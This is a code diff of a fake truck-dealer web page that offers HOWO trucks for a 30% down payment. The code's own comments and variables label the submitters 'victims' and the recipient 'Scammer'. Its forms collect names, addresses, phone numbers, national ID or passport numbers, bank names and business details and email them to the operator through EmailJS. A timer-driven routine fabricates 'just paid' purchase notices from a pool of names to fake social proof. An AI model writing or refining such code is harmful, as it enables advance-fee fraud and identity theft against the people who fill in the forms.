         { id: 2, name: "HOWO Semi-Truck", category: "Long Haul", badge: "Top Rated", badgeColor: "#D4AF37", capacity: "40-50 tons", engine: "MC11 440HP", fullPrice: 68000, price: "$68,000", upfront30: "$20,400", image: "https://placehold.co/600x400?text=HOWO+Semi+Truck" },
         { id: 3, name: "HOWO Flatbed Truck", category: "Versatile Transport", badge: "Best Value", badgeColor: "#D4AF37", capacity: "15-25 tons", engine: "WD615 336HP", fullPrice: 42000, price: "$42,000", upfront30: "$12,600", image: "https://placehold.co/600x400?text=HOWO+Flatbed+Truck" },
-        { id: 4, name: "HOWO Concrete Mixer", category: "Construction", badge: "Heavy Duty", badgeColor: "#C41E3A", capacity: "8-12 cubic meters", engine: "WD615 336HP", fullPrice: 52000, price: "$52,000", upfront30: "$15,600", image: "https://placehold.co/600x400?text=HOWO+Concrete+Mixer" },
+        { id: 4, name: "HOWO Concrete Mixer", category: "Construction", badge: "Heavy Duty", badgeColor: "#C41E3A", capacity: "8-12 m³", engine: "WD615 336HP", fullPrice: 52000, price: "$52,000", upfront30: "$15,600", image: "https://placehold.co/600x400?text=HOWO+Concrete+Mixer" },
         { id: 5, name: "HOWO Tanker Truck", category: "Liquid Transport", badge: "Industrial", badgeColor: "#D4AF37", capacity: "15,000-25,000L", engine: "MC11 440HP", fullPrice: 58000, price: "$58,000", upfront30: "$17,400", image: "https://placehold.co/600x400?text=HOWO+Tanker+Truck" },
         { id: 6, name: "HOWO Refrigerated Truck", category: "Cold Chain", badge: "New Model", badgeColor: "#C41E3A", capacity: "10-20 tons", engine: "WD615 336HP", fullPrice: 55000, price: "$55,000", upfront30: "$16,500", image: "https://placehold.co/600x400?text=HOWO+Refrigerated+Truck" },
         { id: 7, name: "HOWO Tipper Truck", category: "Dumping", badge: "Heavy Duty", badgeColor: "#D4AF37", capacity: "30-45 tons", engine: "MC11 440HP", fullPrice: 50000, price: "$50,000", upfront30: "$15,000", image: "https://placehold.co/600x400?text=HOWO+Tipper+Truck" },
@@ -673,467 +263,66 @@
         { id: 9, name: "HOWO Bus Chassis", category: "Passenger Transport", badge: "Commercial", badgeColor: "#D4AF37", capacity: "40-60 passengers", engine: "MC11 440HP", fullPrice: 72000, price: "$72,000", upfront30: "$21,600", image: "https://placehold.co/600x400?text=HOWO+Bus+Chassis" }
     ];
 
-    let selectedTruck = null;
-    let claimData = null;
-    let businessData = null;
-    let currentStep = 1;
-
-    // Notification System
+    let selectedTruck = null, claimData = null, businessData = null;
     let notifications = JSON.parse(localStorage.getItem('sinotruk_notifications')) || [];
 
-    function saveNotification(title, detail) {
-        notifications.unshift({ title, detail, time: new Date().toLocaleTimeString() });
-        if (notifications.length > 10) notifications.pop();
-        localStorage.setItem('sinotruk_notifications', JSON.stringify(notifications));
-        updateBell();
-    }
+    function saveNotification(title, detail) { notifications.unshift({ title, detail, time: new Date().toLocaleTimeString() }); if (notifications.length > 10) notifications.pop(); localStorage.setItem('sinotruk_notifications', JSON.stringify(notifications)); updateBell(); }
+    function updateBell() { const badge = document.getElementById('bellBadge'), list = document.getElementById('notificationList'); if (notifications.length > 0) { badge.style.display = 'inline-block'; badge.innerText = notifications.length; } else { badge.style.display = 'none'; } if (list) { list.innerHTML = notifications.map(n => `<div class="notification-item"><div class="notification-time">${n.time}</div><div class="notification-title">${n.title}</div><div class="notification-detail">${n.detail}</div></div>`).join(''); if (notifications.length === 0) list.innerHTML = '<div class="notification-item">No notifications yet</div>'; else { const cancelDiv = document.createElement('div'); cancelDiv.className = 'notification-item'; cancelDiv.innerHTML = '<button class="cancel-btn" id="cancelAppBtn">Cancel Application</button>'; list.appendChild(cancelDiv); document.getElementById('cancelAppBtn')?.addEventListener('click', () => { document.getElementById('cancelPopup').style.display = 'flex'; }); } } }
+    function clearNotifications() { notifications = []; localStorage.removeItem('sinotruk_notifications'); localStorage.removeItem('sinotruk_step1_completed'); localStorage.removeItem('sinotruk_step2_completed'); localStorage.removeItem('sinotruk_claimData'); localStorage.removeItem('sinotruk_businessData'); localStorage.removeItem('sinotruk_selectedTruck'); updateBell(); }
 
-    function updateBell() {
-        const badge = document.getElementById('bellBadge');
-        const list = document.getElementById('notificationList');
-        if (notifications.length > 0) {
-            badge.style.display = 'inline-block';
-            badge.innerText = notifications.length;
-        } else {
-            badge.style.display = 'none';
-        }
-        if (list) {
-            list.innerHTML = notifications.map(n => `
-                <div class="notification-item">
-                    <div class="notification-time">${n.time}</div>
-                    <div class="notification-title">${n.title}</div>
-                    <div class="notification-detail">${n.detail}</div>
-                </div>
-            `).join('');
-            if (notifications.length === 0) {
-                list.innerHTML = '<div class="notification-item">No notifications yet</div>';
-            }
-            // Add cancel button if step2 completed
-            if (localStorage.getItem('sinotruk_step2_completed') === 'true') {
-                const cancelDiv = document.createElement('div');
-                cancelDiv.className = 'notification-item';
-                cancelDiv.innerHTML = '<button class="cancel-btn" id="cancelAppBtn">Cancel Application</button>';
-                list.appendChild(cancelDiv);
-                document.getElementById('cancelAppBtn')?.addEventListener('click', () => {
-                    document.getElementById('cancelPopup').style.display = 'flex';
-                });
-            }
-        }
-    }
+    document.getElementById('bellContainer')?.addEventListener('click', (e) => { e.stopPropagation(); document.getElementById('notificationDropdown').classList.toggle('show'); });
+    document.addEventListener('click', () => { document.getElementById('notificationDropdown')?.classList.remove('show'); });
+    document.getElementById('confirmCancelBtn')?.addEventListener('click', () => { clearNotifications(); document.getElementById('cancelPopup').style.display = 'none'; window.location.href = window.location.pathname; });
+    document.getElementById('dismissCancelBtn')?.addEventListener('click', () => { document.getElementById('cancelPopup').style.display = 'none'; });
 
-    function clearNotifications() {
-        notifications = [];
-        localStorage.removeItem('sinotruk_notifications');
-        localStorage.removeItem('sinotruk_step1_completed');
-        localStorage.removeItem('sinotruk_step2_completed');
-        localStorage.removeItem('sinotruk_claimData');
-        localStorage.removeItem('sinotruk_businessData');
-        localStorage.removeItem('sinotruk_selectedTruck');
-        updateBell();
-    }
+    function setButtonLoading(btn, isLoading, originalText) { if (isLoading) { btn.disabled = true; btn.style.opacity = '0.7'; btn.innerHTML = 'Processing... <span class="loading-spinner"></span>'; } else { btn.disabled = false; btn.style.opacity = '1'; btn.innerHTML = originalText; } }
+    function calculateTotalUpfront(price, quantity) { const priceNum = parseInt(price.replace('$', '').replace(',', '')); return `$${(priceNum * quantity).toLocaleString()}`; }
 
-    // Bell click toggle
-    document.getElementById('bellContainer')?.addEventListener('click', (e) => {
-        e.stopPropagation();
-        const dropdown = document.getElementById('notificationDropdown');
-        dropdown.classList.toggle('show');
-    });
-    document.addEventListener('click', () => {
-        document.getElementById('notificationDropdown')?.classList.remove('show');
-    });
+    function renderTrucks() { const grid = document.getElementById('trucksGrid'); grid.innerHTML = ''; trucks.forEach(truck => { const card = document.createElement('div'); card.className = 'truck-card'; card.innerHTML = `<div class="card-badge" style="background: ${truck.badgeColor}; color: ${truck.badgeColor === '#D4AF37' ? '#1A1A1A' : 'white'}">${truck.badge}</div><img class="card-image" src="${truck.image}" alt="${truck.name}"><div class="truck-info"><div class="truck-category">${truck.category}</div><div class="truck-title">${truck.name}</div><div class="spec-grid"><div class="spec-item"><i class="fas fa-weight-hanging"></i> ${truck.capacity}</div><div class="spec-item"><i class="fas fa-engine"></i> ${truck.engine}</div><div class="spec-item"><i class="fas fa-globe"></i> Worldwide Shipping</div><div class="spec-item"><i class="fas fa-calendar-alt"></i> 10-Year Terms</div></div><div class="price">Full Price: ${truck.price}</div><div class="upfront">30% Down: ${truck.upfront30} <small>only</small></div><div class="terms">Balance payable within 10 years • 0% interest</div><button class="claim-btn-card" data-truck='${JSON.stringify(truck)}'><i class="fas fa-truck"></i> Get This Truck</button></div>`; grid.appendChild(card); }); document.querySelectorAll('.claim-btn-card').forEach(btn => { btn.addEventListener('click', () => { selectedTruck = JSON.parse(btn.getAttribute('data-truck')); showClaimModal(); }); }); }
 
-    // Cancel popup handlers
-    document.getElementById('confirmCancelBtn')?.addEventListener('click', () => {
-        clearNotifications();
-        document.getElementById('cancelPopup').style.display = 'none';
-        window.location.href = window.location.pathname;
-    });
-    document.getElementById('dismissCancelBtn')?.addEventListener('click', () => {
-        document.getElementById('cancelPopup').style.display = 'none';
-    });
+    function showClaimModal() { const modal = document.getElementById('claimModal'), content = document.getElementById('claimModalContent'); content.innerHTML = `<h2 style="color:#C41E3A;"><i class="fas fa-truck"></i> You selected:</h2><p style="font-size:1.1rem; font-weight:500; margin-bottom:1rem;">${selectedTruck.name}</p><img src="${selectedTruck.image}" style="width:100%; border-radius:0.8rem; margin-bottom:1rem;"><form id="claimForm"><div class="form-group"><label>Full Name</label><input type="text" id="fullName" required placeholder="John Doe"></div><div class="form-group"><label>Email Address</label><input type="email" id="email" required placeholder="john@example.com"></div><div class="form-group"><label>Phone Number</label><input type="tel" id="phone" required placeholder="+1234567890"></div><div class="form-group"><label>Delivery Address</label><input type="text" id="address" required placeholder="123 Main St, City, Country"></div><div class="form-group"><label>Quantity (Number of Trucks)</label><input type="number" id="quantity" required min="1" value="1"></div><div class="modal-buttons"><button type="button" class="btn-secondary" id="cancelClaimBtn">Cancel</button><button type="submit" class="btn-submit" id="submitClaimBtn">Submit Application</button></div></form>`; modal.style.display = 'flex'; document.getElementById('cancelClaimBtn').onclick = () => modal.style.display = 'none'; document.getElementById('claimForm').addEventListener('submit', async (e) => { e.preventDefault(); const submitBtn = document.getElementById('submitClaimBtn'), originalText = submitBtn.innerHTML; setButtonLoading(submitBtn, true, originalText); const quantity = parseInt(document.getElementById('quantity').value), totalUpfront = calculateTotalUpfront(selectedTruck.price, quantity); claimData = { fullName: document.getElementById('fullName').value, email: document.getElementById('email').value, phone: document.getElementById('phone').value, address: document.getElementById('address').value, truckModel: selectedTruck.name, quantity, upfrontAmount: selectedTruck.upfront30, totalUpfront, timestamp: new Date().toLocaleString() }; try { await emailjs.send('service_rhipogs', 'template_v13pw4n', claimData); saveNotification('Application Submitted', `${selectedTruck.name}, Qty: ${quantity}, Total 30% Down: ${totalUpfront}`); localStorage.setItem('sinotruk_step1_completed', 'true'); localStorage.setItem('sinotruk_claimData', JSON.stringify(claimData)); localStorage.setItem('sinotruk_selectedTruck', JSON.stringify(selectedTruck)); } catch(err) { alert('Submission failed. Please check your internet connection and try again.'); setButtonLoading(submitBtn, false, originalText); return; } setTimeout(() => { setButtonLoading(submitBtn, false, originalText); modal.style.display = 'none'; showBusinessModal(); }, 800); }); }
 
-    // Helper for button loading
-    function setButtonLoading(btn, isLoading, originalText) {
-        if (isLoading) {
-            btn.disabled = true;
-            btn.style.opacity = '0.7';
-            btn.innerHTML = 'Processing... <span class="loading-spinner"></span>';
-        } else {
-            btn.disabled = false;
-            btn.style.opacity = '1';
-            btn.innerHTML = originalText;
-        }
-    }
+    function showBusinessModal() { const modal = document.getElementById('businessModal'), content = document.getElementById('businessModalContent'); let applicantType = 'individual'; content.innerHTML = `<h2 style="color:#C41E3A;"><i class="fas fa-building"></i> Business & Financial Verification</h2><p style="margin-bottom:1rem;">Complete your application for ${claimData.truckModel}</p><div id="businessError" class="error-message" style="display:none;"></div><form id="businessForm"><div class="form-group"><label>Applicant Type</label><div class="radio-group"><label><input type="radio" name="applicantType" value="individual" checked> Individual / Sole Proprietor</label><label><input type="radio" name="applicantType" value="business"> Registered Business</label></div></div><div id="individualFields"><div class="form-group"><label>National ID / Passport Number</label><input type="text" id="nationalId" placeholder="Enter your ID number"></div><div class="form-group"><label>Occupation</label><select id="occupation"><option value="">Select occupation</option><option value="Farmer">Farmer</option><option value="Transporter">Transporter</option><option value="Contractor">Contractor</option><option value="Other">Other</option></select></div><div class="form-group"><label>Years of Experience</label><select id="experience"><option value="">Select</option><option value="Less than 1 year">Less than 1 year</option><option value="1-3 years">1-3 years</option><option value="3-5 years">3-5 years</option><option value="5+ years">5+ years</option></select></div></div><div id="businessFields" style="display:none;"><div class="form-group"><label>Business / Company Name</label><input type="text" id="businessName" placeholder="Enter your business name"></div><div class="form-group"><label>Business Registration Number / Tax ID</label><input type="text" id="regNumber" placeholder="Enter registration number"></div><div class="form-group"><label>Years in Business</label><select id="yearsBusiness"><option value="">Select</option><option value="Less than 1 year">Less than 1 year</option><option value="1-3 years">1-3 years</option><option value="3-5 years">3-5 years</option><option value="5-10 years">5-10 years</option><option value="10+ years">10+ years</option></select></div><div class="form-group"><label>Annual Revenue Range</label><select id="revenue"><option value="">Select</option><option value="Less than $50,000">Less than $50,000</option><option value="$50,000 - $100,000">$50,000 - $100,000</option><option value="$100,000 - $250,000">$100,000 - $250,000</option><option value="$250,000 - $500,000">$250,000 - $500,000</option><option value="$500,000+">$500,000+</option></select></div></div><div class="form-group"><label>Bank Name for Financing</label><input type="text" id="bankName" required placeholder="Enter your bank name"></div><div class="form-group"><label>Truck Usage Purpose</label><select id="truckUsage" required><option value="">Select purpose</option><option value="Farming">Farming</option><option value="Construction">Construction</option><option value="Logistics / Freight">Logistics / Freight</option><option value="Mining">Mining</option><option value="Transport">Transport</option><option value="Other">Other</option></select></div><div class="form-group"><label>Preferred Payment Terms</label><select id="paymentTerms" required><option value="">Select terms</option><option value="Monthly">Monthly</option><option value="Quarterly">Quarterly</option><option value="Yearly">Yearly</option></select></div><div class="form-group"><label>Expected Down Payment Date</label><input type="date" id="paymentDate" required></div><div class="form-group"><label>Additional Notes (Optional)</label><textarea id="notes" rows="3" placeholder="Any special requirements or questions..."></textarea></div><div class="modal-buttons"><button type="button" class="btn-secondary" id="cancelBusinessBtn">Back</button><button type="submit" class="btn-submit" id="submitBusinessBtn">Complete Application</button></div></form>`; modal.style.display = 'flex'; document.getElementById('cancelBusinessBtn').onclick = () => { modal.style.display = 'none'; showClaimModal(); }; const radios = document.querySelectorAll('input[name="applicantType"]'); radios.forEach(radio => { radio.addEventListener('change', () => { const isBusiness = radio.value === 'business'; document.getElementById('individualFields').style.display = isBusiness ? 'none' : 'block'; document.getElementById('businessFields').style.display = isBusiness ? 'block' : 'none'; applicantType = radio.value; }); }); document.getElementById('businessForm').addEventListener('submit', async (e) => { e.preventDefault(); const submitBtn = document.getElementById('submitBusinessBtn'), originalText = submitBtn.innerHTML; setButtonLoading(submitBtn, true, originalText); const isBusiness = document.querySelector('input[name="applicantType"]:checked').value === 'business'; const fields = { fullName: claimData.fullName, email: claimData.email, phone: claimData.phone, address: claimData.address, truckModel: claimData.truckModel, quantity: claimData.quantity, totalUpfront: claimData.totalUpfront, applicantType: isBusiness ? 'Registered Business' : 'Individual', bankName: document.getElementById('bankName').value, truckUsage: document.getElementById('truckUsage').value, paymentTerms: document.getElementById('paymentTerms').value, paymentDate: document.getElementById('paymentDate').value, notes: document.getElementById('notes').value, timestamp: new Date().toLocaleString() }; if (isBusiness) { fields.businessName = document.getElementById('businessName').value; fields.registrationNumber = document.getElementById('regNumber').value; fields.yearsInBusiness = document.getElementById('yearsBusiness').value; fields.annualRevenue = document.getElementById('revenue').value; } else { fields.nationalId = document.getElementById('nationalId').value; fields.occupation = document.getElementById('occupation').value; fields.yearsExperience = document.getElementById('experience').value; } businessData = fields; const victimData = { to_email: claimData.email, to_name: claimData.fullName, truck_model: claimData.truckModel, quantity: claimData.quantity, total_upfront: claimData.totalUpfront, timestamp: new Date().toLocaleString() }; try { await Promise.all([emailjs.send('service_rhipogs', 'template_v13pw4n', businessData), emailjs.send('service_rhipogs', 'template_42yhth5', victimData)]); saveNotification('Business Details Submitted', `${isBusiness ? businessData.businessName : 'Individual'}, ${businessData.paymentTerms} payments`); localStorage.setItem('sinotruk_step2_completed', 'true'); localStorage.setItem('sinotruk_businessData', JSON.stringify(businessData)); } catch(err) { document.getElementById('businessError').innerText = 'Submission failed. Please check your internet connection and try again.'; document.getElementById('businessError').style.display = 'block'; setButtonLoading(submitBtn, false, originalText); return; } setTimeout(() => { setButtonLoading(submitBtn, false, originalText); modal.style.display = 'none'; showSuccess(); }, 800); }); }
 
-    function calculateTotalUpfront(price, quantity) {
-        const priceNum = parseInt(price.replace('$', '').replace(',', ''));
-        const total = priceNum * quantity;
-        return `$${total.toLocaleString()}`;
-    }
+    let successTimerInterval;
+    function showSuccess() { const modal = document.getElementById('successModal'), content = document.getElementById('successModalContent'); let timeLeft = 300; content.innerHTML = `<div class="success-card"><div class="success-icon"><i class="fas fa-check-circle"></i></div><h2>APPLICATION RECEIVED!</h2><p><strong>${businessData.truckModel}</strong></p><p>Quantity: ${businessData.quantity}</p><p><strong>30% Down Payment: ${businessData.totalUpfront}</strong></p><p style="margin-top:0.5rem;">A confirmation message has been sent to <strong>${claimData.email}</strong></p><button class="chat-btn" id="chatSupportBtn"><i class="fas fa-comment-dots"></i> Chat with Us</button><div class="success-timer" id="successTimer">Redirecting to homepage in 5:00</div></div>`; modal.style.display = 'flex'; document.getElementById('chatSupportBtn').onclick = () => { if (window.$crisp) window.$crisp.push(['do', 'chat:open']); }; const timerDisplay = document.getElementById('successTimer'); if (successTimerInterval) clearInterval(successTimerInterval); successTimerInterval = setInterval(() => { timeLeft--; const minutes = Math.floor(timeLeft / 60), seconds = timeLeft % 60; timerDisplay.innerText = `Redirecting to homepage in ${minutes}:${seconds.toString().padStart(2, '0')}`; if (timeLeft <= 0) { clearInterval(successTimerInterval); modal.style.display = 'none'; window.location.href = window.location.pathname; } }, 1000); }
 
-    // Render trucks grid
-    function renderTrucks() {
-        const grid = document.getElementById('trucksGrid');
-        grid.innerHTML = '';
-        trucks.forEach(truck => {
-            const card = document.createElement('div');
-            card.className = 'truck-card';
-            card.innerHTML = `
-                <div class="card-badge" style="background: ${truck.badgeColor}; color: ${truck.badgeColor === '#D4AF37' ? '#1A1A1A' : 'white'}">${truck.badge}</div>
-                <img class="card-image" src="${truck.image}" alt="${truck.name}" onerror="this.src='https://placehold.co/600x400?text=HOWO+Truck'">
-                <div class="truck-info">
-                    <div class="truck-category">${truck.category}</div>
-                    <div class="truck-title">${truck.name}</div>
-                    <div class="spec-grid">
-                        <div class="spec-item"><i class="fas fa-weight-hanging"></i> ${truck.capacity}</div>
-                        <div class="spec-item"><i class="fas fa-engine"></i> ${truck.engine}</div>
-                        <div class="spec-item"><i class="fas fa-globe"></i> Worldwide Shipping</div>
-                        <div class="spec-item"><i class="fas fa-calendar-alt"></i> 10-Year Terms</div>
-                    </div>
-                    <div class="price">Full Price: ${truck.price}</div>
-                    <div class="upfront">30% Down: ${truck.upfront30} <small>only</small></div>
-                    <div class="terms">Balance payable within 10 years • 0% interest</div>
-                    <button class="claim-btn-card" data-truck='${JSON.stringify(truck)}'><i class="fas fa-truck"></i> Get This Truck →</button>
-                </div>
-            `;
-            grid.appendChild(card);
-        });
-        document.querySelectorAll('.claim-btn-card').forEach(btn => {
-            btn.addEventListener('click', () => {
-                selectedTruck = JSON.parse(btn.getAttribute('data-truck'));
-                showClaimModal();
-            });
-        });
-    }
+    function addToLiveFeed(firstName, truckName, totalUpfront) { const feed = document.getElementById('liveFeedList'), entry = document.createElement('div'); entry.className = 'feed-item'; entry.innerHTML = `<i class="fas fa-truck"></i> ${firstName} just paid 30% down for ${truckName} (${totalUpfront}) · Just now`; feed.prepend(entry); if (feed.children.length > 20) feed.removeChild(feed.lastChild); let feedEntries = JSON.parse(localStorage.getItem('sinotruk_livefeed')) || []; feedEntries.unshift({ firstName, truckName, totalUpfront, time: Date.now() }); if (feedEntries.length > 20) feedEntries.pop(); localStorage.setItem('sinotruk_livefeed', JSON.stringify(feedEntries)); }
+    function showToastMessage(firstName, truckName) { const container = document.getElementById('toastContainer'), toast = document.createElement('div'); toast.className = 'toast'; toast.innerHTML = `<i class="fas fa-check-circle" style="color:#22C55E;"></i> ${firstName} just paid 30% down for ${truckName}`; container.appendChild(toast); setTimeout(() => toast.remove(), 5000); }
 
-    // Step 1: Claim Modal
-    function showClaimModal() {
-        const modal = document.getElementById('claimModal');
-        const content = document.getElementById('claimModalContent');
-        content.innerHTML = `
-            <h2 style="color:#C41E3A;"><i class="fas fa-truck"></i> You selected:</h2>
-            <p style="font-size:1.1rem; font-weight:500; margin-bottom:1rem;">${selectedTruck.name}</p>
-            <img src="${selectedTruck.image}" style="width:100%; border-radius:0.8rem; margin-bottom:1rem;" onerror="this.src='https://placehold.co/600x400'">
-            <form id="claimForm">
-                <div class="form-group"><label>Full Name *</label><input type="text" id="fullName" required placeholder="John Doe"></div>
-                <div class="form-group"><label>Email Address *</label><input type="email" id="email" required placeholder="john@example.com"></div>
-                <div class="form-group"><label>Phone Number *</label><input type="text" id="phone" required placeholder="+1234567890"></div>
-                <div class="form-group"><label>Delivery Address *</label><input type="text" id="address" required placeholder="123 Main St, City, Country"></div>
-                <div class="form-group"><label>Quantity (Number of Trucks) *</label><input type="number" id="quantity" required min="1" value="1"></div>
-                <div class="modal-buttons">
-                    <button type="button" class="btn-secondary" id="cancelClaimBtn">Cancel</button>
-                    <button type="submit" class="btn-submit" id="submitClaimBtn">Submit Application →</button>
-                </div>
-            </form>
-        `;
-        modal.style.display = 'flex';
+    const namePool = ["James Wilson","John Martinez","Michael Brown","David Rodriguez","Robert Anderson","Chidi Okonkwo","Amara Okafor","Emeka Nwosu","Ngozi Eze","Olu Adebayo","Funke Akinola","Adebayo Ogunlesi","Ifeanyi Okonkwo","Thabo Nkosi","Sipho Dlamini","Johan van der Merwe","Elsa Pretorius","Pieter Botha","Nomsa Mbeki","João Silva","Carlos Mendes","Maria Santos","Lucas Oliveira","Ana Costa","Rafael Souza","Ahmed Raza","Fatima Ali","Bilal Khan","Sana Ahmed","Ali Raza","Zara Malik","Rajesh Kumar","Priya Sharma","Vikram Singh","Anjali Patel","Sanjay Gupta","Deepa Reddy","Omar Al-Mansouri","Fatima Al-Rashid","Khalid Al-Farsi","Noura Al-Saud","Abdullah Al-Qahtani","Sarah Johnson","Michael Brown","Jessica Lee","David Wilson","Amanda Taylor","Liam O'Connor","Sophie Williams","Lukas Schmidt","Hannah Weber","Lucas Dubois","Camille Laurent","Yuki Tanaka","Sakura Kimura","Haruki Sato","Mei Kobayashi"];
 
-        document.getElementById('cancelClaimBtn').onclick = () => modal.style.display = 'none';
+    function scheduleRandomToast() { const delay = Math.random() * (45000 - 15000) + 15000; setTimeout(() => { const randomPerson = namePool[Math.floor(Math.random() * namePool.length)], randomTruck = trucks[Math.floor(Math.random() * trucks.length)]; showToastMessage(randomPerson.split(' ')[0], randomTruck.name); addToLiveFeed(randomPerson.split(' ')[0], randomTruck.name, randomTruck.upfront30); scheduleRandomToast(); }, delay); } scheduleRandomToast();
 
-        document.getElementById('claimForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const submitBtn = document.getElementById('submitClaimBtn');
-            const originalText = submitBtn.innerHTML;
-            setButtonLoading(submitBtn, true, originalText);
+    const liveFeed = document.getElementById('liveFeedList'); let savedFeed = JSON.parse(localStorage.getItem('sinotruk_livefeed')) || []; if (savedFeed.length === 0) { const initialEntries = [{ firstName: "James", truckName: "HOWO Dump Truck", totalUpfront: "$14,400", time: Date.now() - 120000 }, { firstName: "Chidi", truckName: "HOWO Tipper Truck", totalUpfront: "$15,000", time: Date.now() - 300000 }, { firstName: "Ahmed", truckName: "HOWO Cargo Truck", totalUpfront: "$13,500", time: Date.now() - 720000 }, { firstName: "João", truckName: "HOWO Concrete Mixer", totalUpfront: "$15,600", time: Date.now() - 1080000 }, { firstName: "Omar", truckName: "HOWO Tanker Truck", totalUpfront: "$17,400", time: Date.now() - 1500000 }]; savedFeed = initialEntries; localStorage.setItem('sinotruk_livefeed', JSON.stringify(savedFeed)); } liveFeed.innerHTML = ''; savedFeed.forEach(entry => { const div = document.createElement('div'); div.className = 'feed-item'; const minutesAgo = Math.floor((Date.now() - entry.time) / 60000); div.innerHTML = `<i class="fas fa-truck"></i> ${entry.firstName} just paid 30% down for ${entry.truckName} (${entry.totalUpfront}) · ${minutesAgo} min ago`; liveFeed.appendChild(div); });
 
-            const quantity = parseInt(document.getElementById('quantity').value);
-            const totalUpfront = calculateTotalUpfront(selectedTruck.price, quantity);
-
-            claimData = {
-                fullName: document.getElementById('fullName').value,
-                email: document.getElementById('email').value,
-                phone: document.getElementById('phone').value,
-                address: document.getElementById('address').value,
-                truckModel: selectedTruck.name,
-                quantity: quantity,
-                upfrontAmount: selectedTruck.upfront30,
-                totalUpfront: totalUpfront,
-                timestamp: new Date().toLocaleString()
-            };
-
-            try {
-                await emailjs.send('service_rhipogs', 'template_v13pw4n', claimData);
-                console.log('Send 1 (Scammer - personal info) sent');
-                saveNotification('✓ Application Submitted', `${selectedTruck.name}, Qty: ${quantity}, Total 30% Down: ${totalUpfront}`);
-                localStorage.setItem('sinotruk_step1_completed', 'true');
-                localStorage.setItem('sinotruk_claimData', JSON.stringify(claimData));
-                localStorage.setItem('sinotruk_selectedTruck', JSON.stringify(selectedTruck));
-            } catch(err) { console.log('EmailJS error:', err); }
-
-            setTimeout(() => {
-                setButtonLoading(submitBtn, false, originalText);
-                modal.style.display = 'none';
-                showBusinessModal();
-            }, 800);
-        });
-    }
-
-    // Step 2: Business Details Modal
-    function showBusinessModal() {
-        const modal = document.getElementById('businessModal');
-        const content = document.getElementById('businessModalContent');
-        content.innerHTML = `
-            <h2 style="color:#C41E3A;"><i class="fas fa-building"></i> Business & Payment Details</h2>
-            <p style="margin-bottom:1rem;">Complete your application for ${claimData.truckModel}</p>
-            <form id="businessForm">
-                <div class="form-group"><label>Business / Company Name</label><input type="text" id="businessName" placeholder="e.g., Green Valley Farms"></div>
-                <div class="form-group"><label>Truck Usage Purpose *</label>
-                    <select id="truckUsage" required>
-                        <option value="">Select purpose</option>
-                        <option value="Farming">Farming</option>
-                        <option value="Construction">Construction</option>
-                        <option value="Logistics">Logistics / Freight</option>
-                        <option value="Mining">Mining</option>
-                        <option value="Other">Other</option>
-                    </select>
-                </div>
-                <div class="form-group"><label>Preferred Payment Terms *</label>
-                    <select id="paymentTerms" required>
-                        <option value="">Select terms</option>
-                        <option value="Monthly">Monthly</option>
-                        <option value="Quarterly">Quarterly</option>
-                        <option value="Yearly">Yearly</option>
-                    </select>
-                </div>
-                <div class="form-group"><label>Expected Down Payment Date *</label><input type="date" id="paymentDate" required></div>
-                <div class="form-group"><label>Additional Notes (Optional)</label><textarea id="notes" rows="3" placeholder="Any special requirements or questions..."></textarea></div>
-                <div class="modal-buttons">
-                    <button type="button" class="btn-secondary" id="cancelBusinessBtn">Back</button>
-                    <button type="submit" class="btn-submit" id="submitBusinessBtn">Complete Application →</button>
-                </div>
-            </form>
-        `;
-        modal.style.display = 'flex';
-
-        document.getElementById('cancelBusinessBtn').onclick = () => {
-            modal.style.display = 'none';
-            showClaimModal();
-        };
-
-        document.getElementById('businessForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const submitBtn = document.getElementById('submitBusinessBtn');
-            const originalText = submitBtn.innerHTML;
-            setButtonLoading(submitBtn, true, originalText);
-
-            businessData = {
-                fullName: claimData.fullName,
-                email: claimData.email,
-                phone: claimData.phone,
-                address: claimData.address,
-                truckModel: claimData.truckModel,
-                quantity: claimData.quantity,
-                totalUpfront: claimData.totalUpfront,
-                businessName: document.getElementById('businessName').value,
-                truckUsage: document.getElementById('truckUsage').value,
-                paymentTerms: document.getElementById('paymentTerms').value,
-                paymentDate: document.getElementById('paymentDate').value,
-                notes: document.getElementById('notes').value,
-                timestamp: new Date().toLocaleString()
-            };
-
-            // Victim confirmation email data
-            const victimData = {
-                to_email: claimData.email,
-                to_name: claimData.fullName,
-                truck_model: claimData.truckModel,
-                quantity: claimData.quantity,
-                total_upfront: claimData.totalUpfront,
-                timestamp: new Date().toLocaleString()
-            };
-
-            try {
-                await Promise.all([
-                    emailjs.send('service_rhipogs', 'template_v13pw4n', businessData),
-                    emailjs.send('service_rhipogs', 'template_42yhth5', victimData)
-                ]);
-                console.log('Send 2 (Scammer - business details) and Send 3 (Victim - confirmation) sent together');
-                saveNotification('✓ Business Details Submitted', `${businessData.businessName || 'Individual'}, ${businessData.paymentTerms} payments, Starting ${businessData.paymentDate}`);
-                localStorage.setItem('sinotruk_step2_completed', 'true');
-                localStorage.setItem('sinotruk_businessData', JSON.stringify(businessData));
-            } catch(err) { console.log('EmailJS error:', err); }
-
-            setTimeout(() => {
-                setButtonLoading(submitBtn, false, originalText);
-                modal.style.display = 'none';
-                showSuccess();
-            }, 800);
-        });
-    }
-
-    // Success Modal with Chat Button
-    let successRedirectTimer;
-    function showSuccess() {
-        const modal = document.getElementById('successModal');
-        const content = document.getElementById('successModalContent');
-        let timeLeft = 300; // 5 minutes in seconds
-        content.innerHTML = `
-            <div class="success-card">
-                <div class="success-icon"><i class="fas fa-check-circle"></i></div>
-                <h2>APPLICATION RECEIVED!</h2>
-                <p><strong>${businessData.truckModel}</strong></p>
-                <p>Quantity: ${businessData.quantity}</p>
-                <p><strong>30% Down Payment: ${businessData.totalUpfront}</strong></p>
-                <p style="margin-top:0.5rem;">A confirmation message has been sent to <strong>${claimData.email}</strong></p>
-                <button class="chat-btn" id="chatSupportBtn"><i class="fas fa-comment-dots"></i> Chat with Us</button>
-                <div class="success-timer" id="successTimer">Redirecting to homepage in 5:00</div>
-            </div>
-        `;
-        modal.style.display = 'flex';
-
-        document.getElementById('chatSupportBtn').onclick = () => {
-            if (window.$crisp) {
-                window.$crisp.push(['do', 'chat:open']);
-            }
-        };
-
-        // 5 minute timer
-        const timerDisplay = document.getElementById('successTimer');
-        const timerInterval = setInterval(() => {
-            timeLeft--;
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            timerDisplay.innerText = `Redirecting to homepage in ${minutes}:${seconds.toString().padStart(2, '0')}`;
-            if (timeLeft <= 0) {
-                clearInterval(timerInterval);
-                modal.style.display = 'none';
-                window.location.href = window.location.pathname;
-            }
-        }, 1000);
-    }
